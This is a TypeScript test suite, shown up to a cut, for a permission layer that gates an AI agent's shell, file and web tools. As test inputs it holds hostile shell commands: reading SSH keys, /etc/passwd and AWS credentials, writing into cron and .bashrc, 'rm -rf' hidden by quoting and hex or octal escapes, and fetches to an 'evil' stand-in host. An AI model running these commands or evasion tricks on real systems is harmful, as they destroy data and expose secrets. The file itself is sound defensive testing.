import { homedir, tmpdir } from 'node:os'
import { join } from 'node:path'
import { afterEach, beforeEach, describe, it, expect, vi } from 'vitest'
import {
  alreadyAllowedAsRule,
  cleanupPermissionRules,
  matchRule,
  networkDestination,
  parseTightenOnlyRules,
  patchSubjectPaths,
  permissionSubject,
  persistedRules,
  shellReferencesExternalPath,
  shellRulePatterns,
  shellWritesSensitivePath,
  splitShellCommand
} from './permissions'
import type { PermissionRule } from '@shared/types'

const allow = (tool: string, match: string): PermissionRule => ({ action: 'allow', tool, match })
const deny = (tool: string, match: string): PermissionRule => ({ action: 'deny', tool, match })
const ask = (tool: string, match: string): PermissionRule => ({ action: 'ask', tool, match })

/** An apply_patch envelope from its body lines. */
const envelope = (...body: string[]): string => ['*** Begin Patch', ...body, '*** End Patch'].join('\n')

// A relative `cd` is skipped only while CDPATH is unset (see matchShellRule), so keep a
// CDPATH exported in the shell running the tests from changing what they expect.
beforeEach(() => {
  vi.stubEnv('CDPATH', '')
})
afterEach(() => {
  vi.unstubAllEnvs()
})

describe('permissionSubject', () => {
  it('picks the right field per tool', () => {
    expect(permissionSubject('run_shell', { command: 'git status' })).toBe('git status')
    expect(permissionSubject('web_fetch', { url: 'https://x.com' })).toBe('https://x.com')
    expect(permissionSubject('web_search', { query: 'rust' })).toBe('rust')
    expect(permissionSubject('read_file', { path: 'src/a.ts' })).toBe('src/a.ts')
    expect(permissionSubject('glob', { pattern: '**/*.ts' })).toBe('**/*.ts')
    expect(permissionSubject('read_file', {})).toBe('')
  })

  it('lists every file an apply_patch touches, including a move target', () => {
    const patch = envelope(
      '*** Add File: src/new.ts',
      '+x',
      '*** Update File: src/old.ts',
      '*** Move to: src/renamed.ts',
      '-a',
      '+b',
      '*** Delete File: src/gone.ts'
    )
    const subject = permissionSubject('apply_patch', { patch })
    expect(patchSubjectPaths(subject)).toEqual(['src/new.ts', 'src/old.ts', 'src/renamed.ts', 'src/gone.ts'])
  })

  it('gives a patch that does not parse no subject (it writes nothing)', () => {
    expect(permissionSubject('apply_patch', { patch: 'not a patch' })).toBe('')
    expect(permissionSubject('apply_patch', {})).toBe('')
  })
})

describe('matchRule on apply_patch', () => {
  const root = '/ws'
  const two = envelope('*** Add File: docs/readme.md', '+x', '*** Add File: secrets/key.pem', '+y')
  const subject = (patch: string): string => permissionSubject('apply_patch', { patch })

  it("applies a file rule to the files inside the patch, which it never saw before", () => {
    const rules = [deny('*', 'secrets/**')]
    expect(matchRule(rules, 'apply_patch', subject(two), [root])).toBe('deny')
    expect(matchRule([deny('apply_patch', 'secrets/**')], 'apply_patch', subject(two), [root])).toBe('deny')
  })

  it('denies the whole patch when any one file is denied, whatever allows the rest', () => {
    const rules = [allow('*', 'docs/**'), deny('*', 'secrets/**')]
    expect(matchRule(rules, 'apply_patch', subject(two), [root])).toBe('deny')
  })

  it('asks when any file is ask-gated', () => {
    expect(matchRule([ask('*', 'secrets/**')], 'apply_patch', subject(two), [root])).toBe('ask')
  })

  it('allows only when every file is allowed', () => {
    expect(matchRule([allow('*', 'docs/**')], 'apply_patch', subject(two), [root])).toBeNull()
    expect(
      matchRule([allow('*', 'docs/**'), allow('*', 'secrets/**')], 'apply_patch', subject(two), [root])
    ).toBe('allow')
  })

  it('canonicalizes each file, so a climbing path still meets an absolute deny', () => {
    const climb = envelope('*** Delete File: src/../../etc/passwd')
    expect(matchRule([deny('*', '/etc/**')], 'apply_patch', subject(climb), [root])).toBe('deny')
  })

  it('keeps honoring an apply_patch rule saved over every patch', () => {
    expect(matchRule([allow('apply_patch', '*')], 'apply_patch', subject(two), [root])).toBe('allow')
    expect(matchRule([deny('apply_patch', '*')], 'apply_patch', subject('not a patch'), [root])).toBe('deny')
  })
})

describe('networkDestination', () => {
  it('keys web_fetch / view_localhost on the URL host (lowercased)', () => {
    expect(networkDestination('web_fetch', { url: 'https://API.GitHub.com/repos' })).toBe('api.github.com')
    expect(networkDestination('web_fetch', { url: 'http://example.com:8080/x' })).toBe('example.com')
    expect(networkDestination('view_localhost', { url: 'http://localhost:3000/' })).toBe('localhost')
  })

  it('gives an interactive view_localhost its own key, so a view grant never covers clicking', () => {
    const steps = [{ action: 'click', selector: 'button' }]
    expect(networkDestination('view_localhost', { url: 'http://localhost:3000/', steps })).toBe(
      'localhost (interactive)'
    )
    expect(networkDestination('view_localhost', { url: 'http://localhost:3000/', steps: [] })).toBe('localhost')
    expect(networkDestination('web_fetch', { url: 'https://example.com', steps })).toBe('example.com')
  })

  it('collapses every gh_* call onto github.com (one grant covers them all)', () => {
    expect(networkDestination('gh_pr_create', { title: 'x' })).toBe('github.com')
    expect(networkDestination('gh_run_view', { run_id: 1 })).toBe('github.com')
  })

  it('gives web_search a single stable key (the query has no host)', () => {
    expect(networkDestination('web_search', { query: 'rust async' })).toBe('web_search')
  })

  it('falls back to the tool name for a malformed or missing URL (never a blanket pass)', () => {
    expect(networkDestination('web_fetch', { url: 'not a url' })).toBe('web_fetch')
    expect(networkDestination('web_fetch', {})).toBe('web_fetch')
    expect(networkDestination('some_future_net_tool', {})).toBe('some_future_net_tool')
  })
})

describe('shellWritesSensitivePath', () => {
  const w = shellWritesSensitivePath

  it('catches redirections into a secret file, spaced or glued', () => {
    expect(w('echo "ADMIN_PASSWORD=testpass" > .env')).toBe(true)
    expect(w('echo X >> .env.local')).toBe(true)
    expect(w('printf x >.env')).toBe(true)
    expect(w('cmd 2>>apps/web/.env')).toBe(true)
    expect(w('cmd &> ".env"')).toBe(true)
    expect(w('cp -n .env.example .env; echo "ADMIN_PASSWORD=testpass" > .env; npx next build')).toBe(true)
  })

  it('reads the words bash builds, so quoting or escaping a name does not hide it', () => {
    for (const cmd of ['echo x > \\.env', 'echo x > ".e"nv', "c'p' .env.example $'.env'", 'r\\m .env', 'tee .en\\v']) {
      expect(w(cmd), cmd).toBe(true)
    }
  })

  it('catches file-writing commands and in-place edits naming one', () => {
    expect(w('cp -n .env.example .env')).toBe(true)
    expect(w('mv tmp .env')).toBe(true)
    expect(w('echo X | tee -a .env')).toBe(true)
    expect(w('rm -f .env')).toBe(true)
    expect(w('sudo cp a .env.production')).toBe(true)
    expect(w('dd if=/dev/zero of=.env count=1')).toBe(true)
    expect(w("sed -i '' 's/^ADMIN_PASSWORD=.*/ADMIN_PASSWORD=changeme/' .env")).toBe(true)
    expect(w("perl -pi -e 's/a/b/' .env")).toBe(true)
    expect(w('cp key.pem ~/.ssh/id_ed25519')).toBe(true)
  })

  it('ignores reads, templates, descriptor duplication, and unrelated writes', () => {
    expect(w('cat .env')).toBe(false)
    expect(w('source .env && npm run dev')).toBe(false)
    expect(w("grep -n SECRET .env | sed 's/=.*/=***/'")).toBe(false)
    expect(w("sed 's/a/b/' .env")).toBe(false)
    expect(w('cp .env.example .env.sample')).toBe(false)
    expect(w('echo hi > .env.example')).toBe(false)
    expect(w('npm test > out.log 2>&1')).toBe(false)
    expect(w('cmd >&2')).toBe(false)
    expect(w('test -f .env || echo missing')).toBe(false)
  })
})

describe('shellReferencesExternalPath', () => {
  // A concrete workspace root the commands live in, so absolute paths INTO it are
  // recognised as in-workspace rather than escapes.
  const ROOTS = ['/work/project']
  const ext = (cmd: string): boolean => shellReferencesExternalPath(cmd, ROOTS)

  it('flags absolute and home-relative paths outside the roots', () => {
    expect(ext('cat /etc/passwd')).toBe(true)
    expect(ext('ls /')).toBe(true)
    expect(ext('cat ~/.ssh/id_rsa')).toBe(true)
    expect(ext('ls ~')).toBe(true)
  })

  it('does NOT flag an absolute path that resolves inside a workspace root', () => {
    // The `cd /abs/workspace && …` false positive that forced needless full-auto prompts.
    expect(ext('cd /work/project && npm install')).toBe(false)
    expect(ext('cd /work/project/server && npx tsc')).toBe(false)
    expect(ext('sleep 5 && cd /work/project && ls -la')).toBe(false)
    // A nested absolute path and the bare root itself are both inside.
    expect(ext('cat /work/project/src/index.ts')).toBe(false)
    expect(ext('ls /work/project')).toBe(false)
  })

  it('flags an absolute path that resolves outside every root', () => {
    expect(ext('cat /work/other/secret')).toBe(true)
    // A sibling that merely shares a name prefix is NOT inside (no false negative).
    expect(ext('cat /work/project-secrets/creds')).toBe(true)
    // An absolute path whose `..` climbs back out of the root escapes.
    expect(ext('cat /work/project/../secret')).toBe(true)
  })

  it('honours additional roots', () => {
    const roots = ['/work/a', '/work/b']
    expect(shellReferencesExternalPath('cd /work/b/pkg && npm i', roots)).toBe(false)
    expect(shellReferencesExternalPath('cat /work/a/src/x.ts', roots)).toBe(false)
    expect(shellReferencesExternalPath('cat /work/c/x', roots)).toBe(true)
  })

  it('does NOT flag stdio devices or the sandbox-writable temp dirs', () => {
    // The discard/log idioms agents use on nearly every server start; flagging them
    // forced an approval prompt in full-auto for commands like `lsof -i :5173 2>/dev/null`.
    expect(ext('lsof -i :5173 2>/dev/null')).toBe(false)
    expect(ext('npm run build > /dev/null 2>&1')).toBe(false)
    expect(ext('cmd &>/dev/null')).toBe(false)
    expect(ext('echo hi >/dev/stderr')).toBe(false)
    expect(ext('cat /dev/fd/3')).toBe(false)
    expect(ext('npm run dev > /tmp/vite.log 2>&1')).toBe(false)
    // The device exemption is lexical: climbing out of /dev/null is still an escape.
    expect(ext('cat /dev/null/../../etc/passwd')).toBe(true)
    expect(ext('cat /tmp/vite.log')).toBe(false)
    expect(ext('cat /private/tmp/django.log')).toBe(false)
    expect(ext(`cat ${join(tmpdir(), 'out.txt')}`)).toBe(false)
  })

  it('still flags real device nodes and paths that climb out of a temp dir', () => {
    expect(ext('cat /dev/disk0')).toBe(true)
    expect(ext('dd if=/dev/rdisk2 of=out.img')).toBe(true)
    expect(ext('ls /dev')).toBe(true)
    // Lexical normalization: `/tmp/..` is `/`, not a temp path.
    expect(ext('cat /tmp/../etc/passwd')).toBe(true)
    // A sibling sharing the `/tmp` prefix is not inside it.
    expect(ext('cat /tmpfoo/secret')).toBe(true)
    // The home dir is never scratch, even though temp dirs are.
    expect(ext('cat ~/.ssh/id_rsa 2>/dev/null')).toBe(true)
  })

  it('flags relative paths that climb above the workspace', () => {
    expect(ext('cat ../outside.txt')).toBe(true)
    expect(ext('cat a/../../b')).toBe(true)
    expect(ext('cat ..')).toBe(true)
  })

  it('does not flag in-workspace paths or non-path tokens', () => {
    expect(ext('cat src/index.ts')).toBe(false)
    expect(ext('cat ./README.md')).toBe(false)
    // Climbs then returns — stays within the workspace.
    expect(ext('cat a/../b')).toBe(false)
    expect(ext('git status')).toBe(false)
    expect(ext('npm run build')).toBe(false)
    // A URL contains "//" but is not an absolute filesystem path.
    expect(ext('curl https://example.com')).toBe(false)
  })

  it('looks past an = for env prefixes and flag values', () => {
    expect(ext('FOO=/etc/secret cat $FOO')).toBe(true)
    expect(ext('grep x --file=/etc/hosts')).toBe(true)
    expect(ext('FOO=bar cat src/a.ts')).toBe(false)
    // An `=` value pointing into the workspace is not an escape.
    expect(ext('--project=/work/project/tsconfig.json tsc')).toBe(false)
  })

  it('honours quotes when tokenizing', () => {
    expect(ext('cat "/etc/passwd"')).toBe(true)
    expect(ext("cat '../escape'")).toBe(true)
    expect(ext('echo "hello world"')).toBe(false)
  })

  it('flags the unexpanded $HOME / ${HOME} env var', () => {
    expect(ext('cat $HOME/.ssh/id_rsa')).toBe(true)
    expect(ext('cat ${HOME}/.netrc')).toBe(true)
    expect(ext('grep x --file=$HOME/.aws/credentials')).toBe(true)
    // Boundary-anchored: a different var that merely starts with HOME is not flagged.
    expect(ext('echo $HOMEWORK')).toBe(false)
  })

  it('flags Windows drive-absolute and UNC paths', () => {
    expect(ext('type C:\\Users\\me\\secret.txt')).toBe(true)
    expect(ext('type C:/Windows/System32/config')).toBe(true)
    expect(ext('dir \\\\server\\share')).toBe(true)
  })

  it('flags backslash relative climbs', () => {
    expect(ext('type ..\\..\\outside')).toBe(true)
    // A backslash path that stays inside does not escape.
    expect(ext('type sub\\file.txt')).toBe(false)
  })

  it('flags a redirection glued to an external target', () => {
    // The operator stays inside the token (no space), so the path must be peeled.
    expect(ext('cat <~/.ssh/id_rsa')).toBe(true)
    expect(ext('echo pwn >/etc/cron.d/evil')).toBe(true)
    expect(ext('cat </etc/passwd')).toBe(true)
    expect(ext('cat >>~/.bashrc')).toBe(true)
    // A leading fd on the operator (`2>`, `1>>`) is still peeled.
    expect(ext('run 2>/var/log/x')).toBe(true)
    expect(ext('run 1>>$HOME/out')).toBe(true)
    // A redirection into / relative to the workspace is not an escape.
    expect(ext('echo ok >/work/project/out.txt')).toBe(false)
    expect(ext('echo ok >out.txt')).toBe(false)
  })

  it('flags a quoted external path glued to a flag/env prefix', () => {
    expect(ext('grep secret --file="/etc/shadow"')).toBe(true)
    expect(ext("grep secret --file='/etc/hosts'")).toBe(true)
    expect(ext('SECRET="/etc/passwd" cat x')).toBe(true)
    expect(ext('cat >"/etc/x"')).toBe(true)
    // A quoted `=` value pointing into the workspace is not an escape.
    expect(ext('--project="/work/project/tsconfig.json" tsc')).toBe(false)
    // Quotes that survive into the word (escaped, or nested in the other kind) are
    // peeled too: `eval` or `sh -c` would read them as quoting.
    expect(ext('eval cat \\"/etc/passwd\\"')).toBe(true)
    expect(ext(`cat '"/etc/passwd"'`)).toBe(true)
  })

  it('reads each word as bash does: escapes, `$\'...\'`, `$"..."`, and glued pieces', () => {
    expect(ext("cat $'/etc/passwd'")).toBe(true)
    expect(ext("cat $'\\x2fetc/passwd'")).toBe(true)
    expect(ext('cat $"/etc/passwd"')).toBe(true)
    expect(ext('cat \\/etc/passwd')).toBe(true)
    // Bash leaves an escaped `~` unexpanded, but it is flagged anyway (the safe side).
    expect(ext('cat \\~/.ssh/id_rsa')).toBe(true)
    // Adjacent pieces are one word: `x/../../y` climbs out.
    expect(ext('cat x"/../.."/y')).toBe(true)
    expect(ext("cat ''../secret")).toBe(true)
    // A line continuation joins, it does not start a word.
    expect(ext('cat \\\n/etc/passwd')).toBe(true)
    // Quoting or escaping that leaves an in-workspace path is still not an escape.
    expect(ext("cat $'src/a.ts' \\./b a\"/b\"/../c")).toBe(false)
  })
})

describe('matchRule', () => {
  const rules: PermissionRule[] = [
    { action: 'deny', tool: 'run_shell', match: '*rm -rf*' },
    { action: 'allow', tool: 'run_shell', match: 'git *' },
    { action: 'ask', tool: 'write_file', match: 'src/secret/**' },
    { action: 'allow', tool: '*', match: 'docs/**' }
  ]

  it('returns null when no rules', () => {
    expect(matchRule(undefined, 'run_shell', 'ls')).toBeNull()
    expect(matchRule([], 'run_shell', 'ls')).toBeNull()
  })

  it('first matching rule wins (deny before allow)', () => {
    expect(matchRule(rules, 'run_shell', 'git status')).toBe('allow')
    expect(matchRule(rules, 'run_shell', 'sudo rm -rf /')).toBe('deny')
  })

  it('matches a glob over the subject', () => {
    expect(matchRule(rules, 'write_file', 'src/secret/keys.ts')).toBe('ask')
    expect(matchRule(rules, 'write_file', 'src/app.ts')).toBeNull()
  })

  it('honours the wildcard tool', () => {
    expect(matchRule(rules, 'read_file', 'docs/readme.md')).toBe('allow')
    expect(matchRule(rules, 'edit_file', 'docs/x/y.md')).toBe('allow')
  })

  it('does not match a different tool', () => {
    expect(matchRule(rules, 'web_fetch', 'git status')).toBeNull()
  })

  describe('glob `*` spans `/` for URLs and nested paths', () => {
    it('a URL glob matches across path segments', () => {
      const r: PermissionRule[] = [
        { action: 'allow', tool: 'web_fetch', match: 'https://docs.example.com/*' }
      ]
      expect(matchRule(r, 'web_fetch', 'https://docs.example.com/3/library/os.html')).toBe('allow')
      expect(matchRule(r, 'web_fetch', 'https://other.example.com/x')).toBeNull()
    })

    it('a deny URL glob fires on nested paths (no silent under-match)', () => {
      const r: PermissionRule[] = [
        { action: 'deny', tool: 'web_fetch', match: 'https://evil.example.com/*' }
      ]
      expect(matchRule(r, 'web_fetch', 'https://evil.example.com/track/pixel?x=1')).toBe('deny')
    })

    it('a bare host/dir prefix covers its sub-paths', () => {
      const url: PermissionRule[] = [
        { action: 'deny', tool: 'web_fetch', match: 'https://evil.example.com' }
      ]
      expect(matchRule(url, 'web_fetch', 'https://evil.example.com')).toBe('deny')
      expect(matchRule(url, 'web_fetch', 'https://evil.example.com/a/b')).toBe('deny')

      const dir: PermissionRule[] = [{ action: 'allow', tool: 'read_file', match: 'src' }]
      expect(matchRule(dir, 'read_file', 'src/a/b/c.ts')).toBe('allow')
    })

    it('a path glob spans nested directories', () => {
      const r: PermissionRule[] = [{ action: 'allow', tool: 'read_file', match: 'src/*' }]
      expect(matchRule(r, 'read_file', 'src/a/b/c.ts')).toBe('allow')
      expect(matchRule(r, 'read_file', 'lib/a.ts')).toBeNull()
    })
  })

  describe('path subjects are canonicalized and anchored to the roots', () => {
    const ROOTS = ['/work/project']

    it('a deny cannot be dodged by respelling the same path', () => {
      const r: PermissionRule[] = [deny('read_file', '/etc/*')]
      expect(matchRule(r, 'read_file', '/etc/passwd', ROOTS)).toBe('deny')
      // Same file, different spelling — the rule must still fire.
      expect(matchRule(r, 'read_file', '/tmp/../etc/passwd', ROOTS)).toBe('deny')
      expect(matchRule(r, 'read_file', '/etc/./passwd', ROOTS)).toBe('deny')
    })

    it('a relative allow rule does NOT auto-approve a climb out of the workspace', () => {
      // The core hole: `src/*` is a `^src/.*$` regex, so the raw subject
      // `src/../../../etc/passwd` matched it and auto-approved reading /etc/passwd.
      const r: PermissionRule[] = [allow('read_file', 'src/*')]
      expect(matchRule(r, 'read_file', 'src/../../../etc/passwd', ROOTS)).toBeNull()
      expect(matchRule(r, 'read_file', 'src/a/../../../../etc/passwd', ROOTS)).toBeNull()
      // ...but a climb that returns into src/ is genuinely in src/.
      expect(matchRule(r, 'read_file', 'src/a/../b.ts', ROOTS)).toBe('allow')
    })

    it('anchors a relative rule to the roots, so an absolute in-workspace path matches it', () => {
      const r: PermissionRule[] = [allow('read_file', 'src/*')]
      expect(matchRule(r, 'read_file', '/work/project/src/a.ts', ROOTS)).toBe('allow')
      expect(matchRule(r, 'read_file', '/work/other/src/a.ts', ROOTS)).toBeNull()
    })

    it('anchors an absolute rule, so an equivalent relative path matches it', () => {
      const r: PermissionRule[] = [{ action: 'ask', tool: 'write_file', match: '/work/project/prod/*' }]
      expect(matchRule(r, 'write_file', 'prod/deploy.ts', ROOTS)).toBe('ask')
    })

    it('matches a `~` rule against the expanded home path', () => {
      const r: PermissionRule[] = [deny('read_file', '~/.ssh/*')]
      expect(matchRule(r, 'read_file', `${homedir()}/.ssh/id_rsa`, ROOTS)).toBe('deny')
      // The literal, unexpanded spelling stays covered too.
      expect(matchRule(r, 'read_file', '~/.ssh/id_rsa', ROOTS)).toBe('deny')
    })

    it('honours a secondary root', () => {
      const r: PermissionRule[] = [allow('read_file', 'notes/*')]
      expect(matchRule(r, 'read_file', '/work/vault/notes/a.md', ['/work/project', '/work/vault'])).toBe('allow')
    })

    it('leaves a search query alone (not a path)', () => {
      const r: PermissionRule[] = [allow('web_search', 'rust/../async')]
      expect(matchRule(r, 'web_search', 'rust/../async', ROOTS)).toBe('allow')
    })
  })

  describe('URL rules are case-insensitive on scheme and host', () => {
    it('a deny cannot be dodged by upper-casing the host or scheme', () => {
      const r: PermissionRule[] = [deny('web_fetch', 'https://evil.example.com/*')]
      expect(matchRule(r, 'web_fetch', 'https://EVIL.example.com/steal')).toBe('deny')
      expect(matchRule(r, 'web_fetch', 'HTTPS://Evil.Example.COM/steal')).toBe('deny')
      expect(matchRule(r, 'web_fetch', 'https://evil.example.com:8443/steal')).toBeNull() // port is part of the host:port authority
    })

    it('matches an upper-cased rule against a lower-cased call', () => {
      const r: PermissionRule[] = [allow('web_fetch', 'https://API.GitHub.com/*')]
      expect(matchRule(r, 'web_fetch', 'https://api.github.com/repos')).toBe('allow')
    })

    it('keeps the path case-sensitive (it is, per RFC 3986)', () => {
      const r: PermissionRule[] = [deny('web_fetch', 'https://x.com/Secret/*')]
      expect(matchRule(r, 'web_fetch', 'https://x.com/Secret/a')).toBe('deny')
      expect(matchRule(r, 'web_fetch', 'https://x.com/secret/a')).toBeNull()
    })

    it('does not case-fold a non-URL-shaped pattern', () => {
      // `*Evil*` has no scheme, so it must keep matching case-sensitively.
      const r: PermissionRule[] = [deny('web_fetch', '*/Evil/*')]
      expect(matchRule(r, 'web_fetch', 'https://x.com/Evil/a')).toBe('deny')
      expect(matchRule(r, 'web_fetch', 'https://x.com/evil/a')).toBeNull()
    })
  })

  describe('run_shell quoting cannot dodge a rule', () => {
    const denyRm: PermissionRule[] = [deny('run_shell', '*rm -rf*')]

    it('sees through quotes around the program and its flags', () => {
      expect(matchRule(denyRm, 'run_shell', '"rm" -rf /tmp/x')).toBe('deny')
      expect(matchRule(denyRm, 'run_shell', "'rm' -rf /tmp/x")).toBe('deny')
      expect(matchRule(denyRm, 'run_shell', "r''m -rf /tmp/x")).toBe('deny')
      expect(matchRule(denyRm, 'run_shell', 'rm -r"f" /tmp/x')).toBe('deny')
      expect(matchRule(denyRm, 'run_shell', 'r"m" "-rf" /tmp/x')).toBe('deny')
    })

    it('sees through backslash escapes', () => {
      expect(matchRule(denyRm, 'run_shell', '\\rm -rf /tmp/x')).toBe('deny')
      expect(matchRule(denyRm, 'run_shell', 'r\\m -r\\f /tmp/x')).toBe('deny')
    })

    it("sees through bash's ANSI-C quoting (`$'...'`) and `$\"...\"`", () => {
      for (const cmd of [
        "$'\\x72m' -rf /tmp/x", // hex
        "$'\\162m' -rf /tmp/x", // octal
        "$'rm' -rf /tmp/x",
        "$'\\x{72}m' $'\\055\\x72f' /tmp/x",
        "$'\\u0072\\U0000006d' -rf /tmp/x",
        "r$'m' -r$'f' /tmp/x",
        "$'rm\\0junk' -rf /tmp/x", // a NUL ends the string
        "$'r\\x6d\\c@junk' -rf /tmp/x", // so does `\c@`
        '$"rm" -rf /tmp/x',
        `$"r"'m' -rf /tmp/x`,
        "echo ok && $'\\x72m' -rf /tmp/x"
      ]) {
        expect(matchRule(denyRm, 'run_shell', cmd)).toBe('deny')
      }
      // A rule written with `$'...'` matches what it decodes to.
      expect(matchRule([deny('run_shell', "$'\\x72m' -rf*")], 'run_shell', 'rm -rf /tmp/x')).toBe('deny')
      expect(matchRule([{ action: 'ask', tool: 'run_shell', match: 'curl *' }], 'run_shell', "$'\\143url' x")).toBe('ask')
    })

    it('decodes `$\'...\'` the way bash does, and only outside double quotes', () => {
      const denyAt = (match: string): PermissionRule[] => [deny('run_shell', match)]
      // `\'` does not close the string, and an unknown escape keeps its backslash.
      expect(matchRule(denyAt(`echo "it's \\q"`), 'run_shell', "echo $'it\\'s \\q'")).toBe('deny')
      // `\cX` is control-X; octal and hex take at most 3 and 2 digits.
      expect(matchRule(denyAt('echo \x01A1 \x07g'), 'run_shell', "echo $'\\cA\\1011' $'\\x7g'")).toBe('deny')
      // Inside double quotes `$'` is literal text, and `$$` is the PID, not `$` + `$'`.
      expect(matchRule(denyRm, 'run_shell', `echo "$'\\x72m' -rf"`)).toBeNull()
      expect(matchRule(denyAt('*rm*'), 'run_shell', "echo $$'\\x72m'")).toBeNull()
      expect(matchRule(denyAt('*rm*'), 'run_shell', "echo $$$'\\x72m'")).toBe('deny')
    })

    it('still matches a rule the user wrote WITH quotes', () => {
      const r: PermissionRule[] = [allow('run_shell', 'git commit -m "*"')]
      expect(matchRule(r, 'run_shell', 'git commit -m "a message"')).toBe('allow')
      expect(matchRule(r, 'run_shell', 'git commit -m unquoted')).toBe('allow')
    })

    it('does not let quote-stripping smuggle a command past an allow rule', () => {
      const allowEcho: PermissionRule[] = [allow('run_shell', 'echo *')]
      expect(matchRule(allowEcho, 'run_shell', 'echo "hi" && rm -rf /tmp/x')).toBeNull()
      expect(matchRule(denyRm, 'run_shell', 'echo "hi" && "rm" -rf /tmp/x')).toBe('deny')
    })

    it('a deny or ask still reads a quoted `*`, `~`, or space as the bare one', () => {
      const rules: PermissionRule[] = [deny('run_shell', 'rm -rf ~*'), { action: 'ask', tool: 'run_shell', match: 'ls ~/x y' }]
      for (const cmd of ["rm -rf '~'", 'rm -rf "~"', 'rm -rf \\~', "rm -rf '~/.ssh'"]) {
        expect(matchRule(rules, 'run_shell', cmd)).toBe('deny')
      }
      expect(matchRule(rules, 'run_shell', "ls '~/x y'")).toBe('ask')
      const exactDeny: PermissionRule[] = [{ action: 'deny', tool: 'run_shell', match: 'rm *', exact: true }]
      for (const cmd of ["rm '*'", 'rm "*"', 'rm \\*', 'rm *']) {
        expect(matchRule(exactDeny, 'run_shell', cmd)).toBe('deny')
      }
    })

    it('an allow keeps a quoted `*`, `~`, `$`, space, or `>` apart from a bare one', () => {
      // Each pair reads the same once dequoted, but the shell runs them differently.
      const pairs: [string, string][] = [
        ["rm '*'", 'rm *'],
        ['rm \\*', 'rm *'],
        ["rm -rf '~'", 'rm -rf ~'],
        ["rm -rf '~'", 'rm -rf ~/x'],
        ["rm -rf 'build ~'", 'rm -rf build ~'],
        ["rm -rf '$HOME'", 'rm -rf $HOME'],
        ["rm -rf '$HOME'", 'rm -rf "$HOME"'],
        ['rm -rf "$X"', 'rm -rf $X'],
        ["echo 'a > ~/.bashrc'", 'echo a > ~/.bashrc'],
        ["ls '?.ts'", 'ls ?.ts'],
        ["ls '[ab].ts'", 'ls [ab].ts'],
        ["echo '{a,b}'", 'echo {a,b}']
      ]
      for (const [approved, other] of pairs) {
        const exact: PermissionRule[] = [{ action: 'allow', tool: 'run_shell', match: approved, exact: true }]
        expect(matchRule(exact, 'run_shell', approved)).toBe('allow')
        expect(matchRule(exact, 'run_shell', other)).toBeNull()
        // A `*` in a rule that is not exact is its wildcard, quoted or not (see below).
        if (!approved.includes('*')) expect(matchRule([allow('run_shell', approved)], 'run_shell', other)).toBeNull()
        // Nor the other way round: approving the bare form allows no quoted one.
        expect(matchRule([{ action: 'allow', tool: 'run_shell', match: other, exact: true }], 'run_shell', approved)).toBeNull()
      }
    })

    it('an allow still folds respellings that change nothing', () => {
      const exact: PermissionRule[] = [{ action: 'allow', tool: 'run_shell', match: "rm '*'", exact: true }]
      for (const cmd of ['rm "*"', 'rm \\*', `r''m '*'`, `"rm"  '*'`]) {
        expect(matchRule(exact, 'run_shell', cmd)).toBe('allow')
      }
      expect(matchRule([allow('run_shell', 'git status')], 'run_shell', `"git" 'status' -s`)).toBe('allow')
      expect(matchRule([allow('run_shell', 'cat src/a.ts')], 'run_shell', 'cat "src/a.ts"')).toBe('allow')
      expect(matchRule([allow('run_shell', "rm -rf '~'")], 'run_shell', 'rm -rf "~" x')).toBe('allow')
      expect(matchRule([allow('run_shell', 'echo "$HOME"')], 'run_shell', 'echo "$HOME"')).toBe('allow')
      expect(matchRule([allow('run_shell', 'git status')], 'run_shell', "$'git' $'\\x73tatus' -s")).toBe('allow')
      expect(matchRule(exact, 'run_shell', "rm $'\\x2a'")).toBe('allow')
    })

    it('an allow keeps an empty quoted word apart from no word at all', () => {
      // bash runs nothing for `'' rm -rf /` (": command not found"), and passes `rm` an
      // empty argument in `rm '' -rf x`, so neither is the command without the `''`.
      const pairs: [string, string][] = [
        ["'' rm -rf /", 'rm -rf /'],
        ['"" rm -rf /', 'rm -rf /'],
        ["$'' rm -rf /", 'rm -rf /'],
        ["$'\\0' rm -rf /", 'rm -rf /'], // a NUL ends the string, leaving it empty
        ['$"" rm -rf /', 'rm -rf /'],
        ["rm '' -rf x", 'rm -rf x'],
        ["rm -rf x ''", 'rm -rf x'],
        ["rm -rf / '", 'rm -rf /'] // an unclosed quote is a syntax error: nothing runs
      ]
      for (const [approved, other] of pairs) {
        const exact: PermissionRule[] = [{ action: 'allow', tool: 'run_shell', match: approved, exact: true }]
        expect(matchRule(exact, 'run_shell', approved)).toBe('allow')
        expect(matchRule(exact, 'run_shell', other)).toBeNull()
        expect(matchRule([allow('run_shell', approved)], 'run_shell', other)).toBeNull()
        expect(matchRule([{ action: 'allow', tool: 'run_shell', match: other, exact: true }], 'run_shell', approved)).toBeNull()
      }
      expect(matchRule([allow('run_shell', 'rm -rf x')], 'run_shell', "rm '' -rf x")).toBeNull()
      expect(matchRule([allow('run_shell', 'rm -rf /')], 'run_shell', "'' rm -rf /")).toBeNull()
      // An empty word folds only with another empty word, however it is spelled or spaced.
      const empty: PermissionRule[] = [{ action: 'allow', tool: 'run_shell', match: "rm '' -rf x", exact: true }]
      for (const cmd of ['rm "" -rf x', "rm $'' -rf x", "rm  ''   -rf x", `rm ''"" -rf x`]) {
        expect(matchRule(empty, 'run_shell', cmd)).toBe('allow')
      }
      expect(matchRule(empty, 'run_shell', "rm '' '' -rf x")).toBeNull()
      // Empty quotes inside a word add nothing to it, as in bash.
      expect(matchRule([allow('run_shell', 'rm -f a')], 'run_shell', `r''m -f a"" ''`)).toBe('allow')
      expect(matchRule([{ action: 'allow', tool: 'run_shell', match: 'rm -f a', exact: true }], 'run_shell', `''rm -f a""`)).toBe(
        'allow'
      )
      // A hand-written `*` still covers an empty argument.
      expect(matchRule([allow('run_shell', 'git commit -m "*"')], 'run_shell', `git commit -m ''`)).toBe('allow')
      // A deny still reads past the empty word, so it fires on more, never less.
      expect(matchRule(denyRm, 'run_shell', "'' rm -rf /tmp/x")).toBe('deny')
      expect(matchRule(denyRm, 'run_shell', "rm '' -rf /tmp/x")).toBe('deny')
    })

    it('an allow keeps quoted or escaped whitespace as written', () => {
      // bash splits words only on unquoted spaces, tabs, and newlines. `rm 'my  file'`
      // names a file with two spaces; `rm \  -rf x` passes rm " ", -rf, and x, while
      // `rm \ -rf x` passes " -rf" and x; `find . -delete \ ` passes find a lone " ", so
      // it errors and deletes nothing. A no-break space or `\r` is part of a word to bash.
      const pairs: [string, string][] = [
        ["rm 'my  file'", "rm 'my file'"],
        ['rm "my  file"', 'rm "my file"'],
        ["rm 'my\tfile'", "rm 'my file'"],
        ["rm $'my  file'", "rm $'my file'"],
